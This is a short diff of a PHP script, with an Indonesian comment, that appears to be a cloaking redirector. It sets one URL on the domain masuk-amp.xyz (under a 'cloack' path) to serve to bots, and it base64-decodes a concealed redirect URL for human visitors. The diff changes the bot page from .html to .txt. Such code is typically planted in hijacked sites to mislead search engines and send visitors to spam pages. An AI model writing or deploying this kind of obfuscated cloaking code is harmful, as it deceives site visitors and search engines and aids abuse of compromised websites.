@@ -29,7 +29,7 @@ function get_client_ip() {
 $ip = get_client_ip();
 
 // URL konten untuk bot & redirect user
-$bot_url = "https://masuk-amp.xyz/cloack/thuyenxua.html";
+$bot_url = "https://masuk-amp.xyz/cloack/thuyenxua.txt";
 $encoded_redirect = "aHR0cHM6Ly9tYXN1ay1hbXAueHl6L3RodXllbnh1YS5odG1s"; 
 $reff_url = base64_decode($encoded_redirect);
 
